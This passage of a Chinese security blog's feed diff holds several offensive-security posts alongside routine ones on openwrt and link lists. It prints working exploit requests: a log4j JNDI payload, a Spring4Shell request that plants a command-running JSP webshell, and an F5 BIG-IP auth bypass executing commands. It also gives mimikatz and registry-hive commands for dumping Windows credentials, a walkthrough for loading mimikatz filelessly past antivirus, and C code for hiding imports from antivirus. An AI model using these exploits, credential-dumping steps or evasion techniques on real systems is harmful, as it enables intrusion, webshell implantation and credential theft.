5000</span><br><span class="line">protocol = kcp</span><br><span class="line">tls_enable = true</span><br><span class="line">authentication_method = token</span><br><span class="line">token = you_token</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 11111</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>远程加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c http://127.0.0.1/frpc.ini</span><br></pre></td></tr></table></figure><h1 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h1><p>可以使用这个<a href="https://github.com/Ggasdfg321/FreeFRP">https://github.com/Ggasdfg321/FreeFRP</a>来搜索互联网上未授权的frp。</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>感谢开源</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;今年的华为行动来的格外的早一些，过完年环境忘得差不多了，打内网没有frp怎么行，搞到一半发现有更方便的防止溯源的方法，文末说一下，就这样。&lt;</summary>
+      
+    
+    
+    
+    
+    <category term="内网" scheme="https://blog.njcit.me/tags/%E5%86%85%E7%BD%91/"/>
+    
+    <category term="frp" scheme="https://blog.njcit.me/tags/frp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nali数据库分享</title>
+    <link href="https://blog.njcit.me/2023/02/01/%E6%9D%82%E9%A1%B9/nali%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E4%BA%AB/"/>
+    <id>https://blog.njcit.me/2023/02/01/%E6%9D%82%E9%A1%B9/nali%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E4%BA%AB/</id>
+    <published>2023-02-01T00:54:05.000Z</published>
+    <updated>2023-02-02T06:08:16.743Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>链接：<a href="https://wwi.lanzoup.com/iDva60maofkh">https://wwi.lanzoup.com/iDva60maofkh</a>  </p><p>在新机器上用scoop装nali，发现域名解析失败了：</p><p><img src="/../../images/nali%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E4%BA%AB/image-20230201085739354.png" alt="image-20230201085739354"></p><p>用我上面的文件保存在如下路径C:\Users\{user}\AppData\Local\nali,即可h</p><p><img src="/../../images/nali%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E4%BA%AB/image-20230201085849260.png" alt="image-20230201085849260"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;https://wwi.lanzoup.com/iDva60maofkh&quot;&gt;https://wwi.lanzoup.</summary>
+      
+    
+    
+    
+    
+    <category term="nali" scheme="https://blog.njcit.me/tags/nali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2022 top 10漏洞</title>
+    <link href="https://blog.njcit.me/2023/01/28/poc_exp/2022_top10/"/>
+    <id>https://blog.njcit.me/2023/01/28/poc_exp/2022_top10/</id>
+    <published>2023-01-28T02:14:22.000Z</published>
+    <updated>2023-01-28T03:26:43.844Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现top10居然有好几个我没遇到过，这不得记录一下。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="CVE-2021-44228-log4j远程代码执行"><a href="#CVE-2021-44228-log4j远程代码执行" class="headerlink" title="CVE-2021-44228 log4j远程代码执行"></a>CVE-2021-44228 log4j远程代码执行</h2><p>基础payload:${jndi:ldap:&#x2F;&#x2F;ky28eo.dnslog.cn}</p><h2 id="CVE-2022-30190"><a href="#CVE-2022-30190" class="headerlink" title="CVE-2022-30190"></a>CVE-2022-30190</h2><p>看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：<a href="https://github.com/JohnHammond/msdt-follina">https://github.com/JohnHammond/msdt-follina</a></p><h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p>spring的一个洞，限制比较多，poc如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host:x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CVE-2022-0609"><a href="#CVE-2022-0609" class="headerlink" title="CVE-2022-0609"></a>CVE-2022-0609</h2><p>chrome漏洞，无poc，可以参考先知的分析文章</p><h2 id="F5-BIGIP认证绕过-CVE-2022-1388"><a href="#F5-BIGIP认证绕过-CVE-2022-1388" class="headerlink" title="F5 BIGIP认证绕过  CVE-2022-1388"></a>F5 BIGIP认证绕过  CVE-2022-1388</h2><p>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">X-F5-Auth-Token: a</span><br><span class="line">Connection: X-F5-Auth-Token</span><br><span class="line">Content-type: application/json</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;, &quot;utilCmdArgs&quot;: &quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h2><p>这个 Office RCE 漏洞非常经典，在当时是通杀所有 Office 版本的。poc：<a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p><h2 id="CVE-2022-41040-amp-amp-CVE-2022-41082"><a href="#CVE-2022-41040-amp-amp-CVE-2022-41082" class="headerlink" title="CVE-2022-41040 &amp;&amp; CVE-2022-41082"></a>CVE-2022-41040 &amp;&amp; CVE-2022-41082</h2><p>CVE-2022-41040 Microsoft Exchange Server权限提升漏洞<br>CVE-2022-41082 Microsoft Exchange Server 远程执行代码漏洞  </p><p>poc :<a href="https://github.com/CronUp/Vulnerabilidades">https://github.com/CronUp/Vulnerabilidades</a></p><h2 id="CVE-2022-27925-amp-amp-CVE-2022-41352"><a href="#CVE-2022-27925-amp-amp-CVE-2022-41352" class="headerlink" title="CVE-2022-27925 &amp;&amp; CVE-2022-41352"></a>CVE-2022-27925 &amp;&amp; CVE-2022-41352</h2><ol><li><p><a href="https://github.com/vnhacker1337/CVE-2022-27925-PoC">https://github.com/vnhacker1337/CVE-2022-27925-PoC</a></p></li><li><p><a href="https://github.com/Cr4ckC4t/cve-2022-41352-zimbra-rce">https://github.com/Cr4ckC4t/cve-2022-41352-zimbra-rce</a></p></li></ol><h2 id="CVE-2022-26134"><a href="#CVE-2022-26134" class="headerlink" title="CVE-2022-26134"></a>CVE-2022-26134</h2><p><a href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></p><h2 id="CVE-2022-30525"><a href="#CVE-2022-30525" class="headerlink" title="CVE-2022-30525"></a>CVE-2022-30525</h2><p><a href="https://github.com/Henry4E36/CVE-2022-30525">https://github.com/Henry4E36/CVE-2022-30525</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://www.cnblogs.com/loongten/p/15822195.html">https://www.cnblogs.com/loongten/p/15822195.html</a></li><li><a href="https://paper.seebug.org/1915/">https://paper.seebug.org/1915/</a></li><li><a href="https://blog.csdn.net/qq_45894840/article/details/125200463">https://blog.csdn.net/qq_45894840/article/details/125200463</a></li><li><a href="https://www.cnblogs.com/cute-puli/p/16329332.html">https://www.cnblogs.com/cute-puli/p/16329332.html</a></li><li><a href="https://xz.aliyun.com/t/11121">https://xz.aliyun.com/t/11121</a></li><li><a href="https://xz.aliyun.com/t/11418">https://xz.aliyun.com/t/11418</a></li><li><a href="https://www.sqlsec.com/2020/10/office.html">https://www.sqlsec.com/2020/10/office.html</a></li><li><a href="https://www.cnblogs.com/dnoir/p/microsoft-exchange-server-cve202241040--cve2022410.html">https://www.cnblogs.com/dnoir/p/microsoft-exchange-server-cve202241040--cve2022410.html</a></li><li><a href="https://www.yang99.top/index.php/archives/82/">https://www.yang99.top/index.php/archives/82/</a></li><li><a href="https://zgao.top/cve-2022-26134-confluence-ognl%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://zgao.top/cve-2022-26134-confluence-ognl%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li><li><a href="https://zgao.top/cve-2022-30525-zyxel-firewalls-ztp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://zgao.top/cve-2022-30525-zyxel-firewalls-ztp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;发现top10居然有好几个我没遇到过，这不得记录一下。&lt;/p&gt;
+&lt;h1 id=&quot;exp&quot;&gt;&lt;a href=&quot;#exp&quot; class=&quot;hea</summary>
+      
+    
+    
+    
+    
+    <category term="exp" scheme="https://blog.njcit.me/tags/exp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>openwrt相关</title>
+    <link href="https://blog.njcit.me/2023/01/18/%E6%9D%82%E9%A1%B9/openwrt%E7%9B%B8%E5%85%B3/"/>
+    <id>https://blog.njcit.me/2023/01/18/%E6%9D%82%E9%A1%B9/openwrt%E7%9B%B8%E5%85%B3/</id>
+    <published>2023-01-18T07:54:32.000Z</published>
+    <updated>2023-03-10T01:29:09.474Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>生命不息，折腾不止，从斐讯k1到x86，感谢openwrt开发者的无私贡献。</p><h1 id="常用固件"><a href="#常用固件" class="headerlink" title="常用固件"></a>常用固件</h1><ul><li><a href="https://github.com/kiddin9/OpenWrt_x86-r2s-r4s-r5s-N1%E3%80%81">https://github.com/kiddin9/OpenWrt_x86-r2s-r4s-r5s-N1、</a></li><li><a href="https://openwrt.org/zh/downloads">https://openwrt.org/zh/downloads</a></li></ul><h1 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h1><ul><li><a href="https://www.right.com.cn/forum/portal.php">https://www.right.com.cn/forum/portal.php</a></li></ul><h1 id="刷写"><a href="#刷写" class="headerlink" title="刷写"></a>刷写</h1><p>注意，要不你放&#x2F;tmp&#x2F;upload&#x2F;，要不你就放在u盘里。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/tmp/upload/openwrt-x86-64-combined-squashfs.img of=/dev/sda</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;生命不息，折腾不止，从斐讯k1到x86，感谢openwrt开发者的无私贡献。&lt;/p&gt;
+&lt;h1 id=&quot;常用固件&quot;&gt;&lt;a href=&quot;#常用固</summary>
+      
+    
+    
+    
+    
+    <category term="openwrt" scheme="https://blog.njcit.me/tags/openwrt/"/>
+    
+    <category term="路由器" scheme="https://blog.njcit.me/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>值得一看的网站</title>
+    <link href="https://blog.njcit.me/2023/01/18/%E9%93%BE%E6%8E%A5/index/"/>
+    <id>https://blog.njcit.me/2023/01/18/%E9%93%BE%E6%8E%A5/index/</id>
+    <published>2023-01-18T07:14:22.000Z</published>
+    <updated>2023-01-18T07:06:18.953Z</updated>
+    
+    <content type="html"><![CDATA[<ul><li><a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></li><li><a href="https://www.somedoc.net/">https://www.somedoc.net/</a></li><li><a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></li><li><a href="https://tttang.com/">https://tttang.com/</a></li><li><a href="https://i.hacking8.com/">https://i.hacking8.com/</a></li><li><a href="https://bbs.kanxue.com/">https://bbs.kanxue.com/</a></li><li><a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></li><li><a href="https://www.anquanke.com/">https://www.anquanke.com/</a></li><li><a href="https://paper.seebug.org/">https://paper.seebug.org/</a></li><li><a href="https://govuln.com/news/">https://govuln.com/news/</a></li><li><a href="https://www.v2ex.com/">https://www.v2ex.com/</a></li><li><a href="https://pan.icu/">https://pan.icu/</a></li><li><a href="https://stack.chaitin.com/">https://stack.chaitin.com/</a></li><li><a href="https://tool.lu/">https://tool.lu/</a></li><li><a href="https://www.somd5.com/">https://www.somd5.com/</a></li><li><a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li><li><a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets</a></li><li><a href="https://websec.readthedocs.io/zh/latest/">https://websec.readthedocs.io/zh/latest/</a></li><li><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></li><li><a href="http://wiki.peiqi.tech/">http://wiki.peiqi.tech/</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://3gstudent.github.io/&quot;&gt;https://3gstudent.github.io/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.somedoc.net/&quot;&gt;https://www.som</summary>
+      
+    
+    
+    
+    
+    <category term="something" scheme="https://blog.njcit.me/tags/something/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>内网渗透记录</title>
+    <link href="https://blog.njcit.me/2023/01/18/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"/>
+    <id>https://blog.njcit.me/2023/01/18/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</id>
+    <published>2023-01-18T03:05:52.000Z</published>
+    <updated>2023-02-10T01:54:16.498Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="在Windows环境中抓密码"><a href="#在Windows环境中抓密码" class="headerlink" title="在Windows环境中抓密码"></a>在Windows环境中抓密码</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li><p>搞安全谁不知道这个工具<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p></li><li><p>微软官方的工具，带数字签名，有一定的免杀效果但不多<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a></p></li><li><p>SqlDumper，默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本。</p></li><li><p>powershell脚本<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a></p></li><li><p>之前能过卡巴斯基dump lsass的工具<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">xpn</a></p></li></ul><h3 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h3><ul><li>mimikatz<br>交互模式<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li></ul><p>一句话模式</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>log sekurlsa::logonpasswords full<span class="string">&quot;&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>配合sam和system文件,文件位置C:\Windows\System32\config，默认情况下由于文件占用无法复制出来，可以使用以下命令保存。火绒居然不拦截，果然装火绒就是图一乐。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SystemBkup.hiv</span><br><span class="line">reg save HKLM\SAM SamBkup.hiv</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h3 id="通用免杀"><a href="#通用免杀" class="headerlink" title="通用免杀"></a>通用免杀</h3><p>链接：<a href="https://github.com/TheD1rkMtr/FilelessPELoader">https://github.com/TheD1rkMtr/FilelessPELoader</a>  </p><p>简易教程  </p><p>server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TheD1rkMtr/FilelessPELoader</span><br><span class="line"><span class="built_in">cd</span> FilelessPELoader</span><br><span class="line"><span class="built_in">rm</span> mimikatz.exe</span><br><span class="line">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip</span><br><span class="line">7z x mimikatz_trunk.zip</span><br><span class="line"><span class="built_in">mv</span> x64/mimikatz.exe  .</span><br><span class="line">python3 aes.py mimikatz.exe</span><br><span class="line"><span class="comment">## 启动http 服务</span></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>client</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl /EHsc FilelessPELoader.cpp</span><br></pre></td></tr></table></figure><p>或者使用Visual Studio 2022编译</p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilelessPELoader.exe 10.0.0.114 8000 cipher.bin key.bin</span><br></pre></td></tr></table></figure><p>借用项目的图</p><p><img src="/../../source/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/217600375-ed3f0f48-f9a5-4bf9-839c-8561c4679479.png" alt="filelessremotepe"></p><h3 id="mimikatz免杀"><a href="#mimikatz免杀" class="headerlink" title="mimikatz免杀"></a>mimikatz免杀</h3><ul><li><p><a href="https://github.com/wheelerlaw/go-mimikatz">https://github.com/wheelerlaw/go-mimikatz</a></p></li><li><p><a href="https://xz.aliyun.com/t/10821">https://xz.aliyun.com/t/10821</a></p></li><li><p><a href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.freebuf.com/articles/web/231880.html">https://www.freebuf.com/articles/web/231880.html</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li><li><a href="https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/">https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/</a></li><li><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&amp;#x2F;命令&amp;#x2F;工具,省的每次用都要去搜，机</summary>
+      
+    
+    
+    
+    
+    <category term="内网渗透" scheme="https://blog.njcit.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="渗透测试" scheme="https://blog.njcit.me/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>c和c++相关笔记</title>
+    <link href="https://blog.njcit.me/2023/01/16/%E5%86%99%E4%BB%A3%E7%A0%81/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
+    <id>https://blog.njcit.me/2023/01/16/%E5%86%99%E4%BB%A3%E7%A0%81/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/</id>
+    <published>2023-01-16T01:37:52.000Z</published>
+    <updated>2023-02-02T06:07:47.033Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>多线程卷起来，要把理论落实到实践中去，一点点积累起来逆向的基础，一点点学习和杀软对抗，迟早有一天我也能成为re大佬。这篇文章主要记录一下学习隐藏导入表的学习记录。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="c编译环境搭建"><a href="#c编译环境搭建" class="headerlink" title="c编译环境搭建"></a>c编译环境搭建</h2><ul><li><p>下载<a href="https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/">MinGW</a>并将bin目录加入环境变量；</p></li><li><p>下载<a href="https://code.visualstudio.com/">vscode</a></p></li><li><p>下载<a href="https://visualstudio.microsoft.com/zh-hans/">visualstudio</a></p></li></ul><p>环境搭建到此为止</p><h2 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h2><h3 id="隐藏User32-dll导入表"><a href="#隐藏User32-dll导入表" class="headerlink" title="隐藏User32.dll导入表"></a>隐藏User32.dll导入表</h3><p>隐藏前的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    MessageBox(<span class="number">0</span>, TEXT(<span class="string">&quot;hello world&quot;</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>隐藏后的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WINAPI * pMessageBox)</span> <span class="params">(</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    HWND    hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT    uType</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    pMessageBox MyMessageBox = (pMessageBox)GetProcAddress(LoadLibrary(<span class="string">&quot;User32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    MyMessageBox(<span class="number">0</span>, TEXT(<span class="string">&quot;hello world&quot;</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先查看GetProcAddress的文档，可以直接在参考链接3进行搜索，其他api也可以在里面搜索，不做过多赘述。</p><p>可以看到GetProcAddress这个函数需要传入两个参数，向我这样的初学者可能不太理解，直接看官方给的例子：</p><p><img src="/../../images/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/image-20230117144042599.png" alt="image-20230117144042599"></p><p><img src="/../../images/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/image-20230117144224707.png" alt="image-20230117144224707"></p><p>可以看到首先使用typedef定义了一个类似结构体的东东。</p><p><img src="/../../images/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/image-20230117144717784.png" 